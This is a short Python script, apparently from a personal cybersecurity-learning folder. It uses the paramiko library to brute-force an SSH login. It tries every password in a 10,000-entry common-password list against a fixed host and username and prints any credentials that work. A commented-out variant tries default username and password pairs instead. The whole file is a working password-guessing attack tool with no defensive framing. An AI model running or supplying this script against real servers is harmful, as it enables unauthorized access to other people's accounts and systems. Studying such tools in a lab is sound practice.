import paramiko

def ssh_login(host, port, u, p):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=u, password=p)
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print(f"Success: {u}, {p}")
    except:
        return
    ssh.close()

host = "169.254.169.254"
port = 22
u = "rhog"

'''
with open("/Users/keiratan/Desktop/Cybersec/python-for-cybersec/additional-files/defaults.txt") as f:
    for line in f:
        u, p = line.split()
        u, p = u.strip(), p.strip()
        ssh_login(host, port, u, p)
'''

with open("/Users/keiratan/Desktop/Cybersec/python-for-cybersec/additional-files/10k-most-common.txt") as f:
    for line in f:
        p = line.strip()
        ssh_login(host, port, u, p)